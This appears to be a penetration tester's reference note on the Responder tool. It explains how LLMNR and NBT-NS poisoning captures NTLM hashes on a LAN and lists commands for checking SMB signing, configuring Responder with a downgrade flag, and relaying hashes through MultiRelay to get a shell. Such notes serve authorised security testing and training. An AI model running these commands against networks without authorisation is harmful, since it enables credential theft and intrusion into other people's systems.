# Responder

Responder can capture NTLMv1/v2 hashes and relaying them for authentication to other systems if SMB signing is disabled.

Responder works by listening for LLMNR or NBT-NS broadcast messages, and spoofing responses to targeted hosts, resulting in intercepting hashes we can either pass (relay) to other systems or crack offline.

With its MultiRelay tool, we can relay the hashes to other machines on the LAN and provide us a MultiRelay shell. It can also be used on windows as long as SMB is disabled!

## [[NTLM Relaying]]

1.  Check if SMB signing with sub-tool RunFinger.py  
    `python ./Responder/tools/RunFinger.py -i <target IP>`
    
2.  Set the following values in Responder.conf  
    ```bash
    SMB = Off
    HTTP = Off
    ```
    
3.  Start the Responder and answer to all LLMNR requests + --lm (add downgrade attack)  
    `python ./Responder/Responder.py -I eth0 --lm`
    
4.  In parallel start [[Tools/MultiRelay]] | [[Tools/smbrelayx]] to use found credentials to gain access/info  
    `python ./Responder/tools/MultiRelay.py -t <target IP> -u ALL`



```meta
requirements: 
results: 
oss: #linux
source: https://github.com/lgandx/Responder
description: Responder is an LLMNR, NBT-NS and MDNS poisoner.
```